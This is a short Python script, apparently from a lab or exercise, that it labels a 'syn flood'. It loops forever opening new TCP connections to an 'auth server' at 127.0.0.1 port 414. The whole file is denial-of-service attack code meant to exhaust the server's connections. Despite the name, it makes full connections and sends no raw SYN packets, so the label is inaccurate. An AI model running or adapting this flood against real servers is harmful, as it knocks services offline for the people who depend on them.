import socket

# Socket IP and port global variables
server_host = "127.0.0.1"
server_port = 414

print("Starting syn flood")

# Syn flood loop
while True:
    # Creating socket
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # Connecting to auth server
    server.connect((server_host, server_port))
    print("Creating new connection to server ...")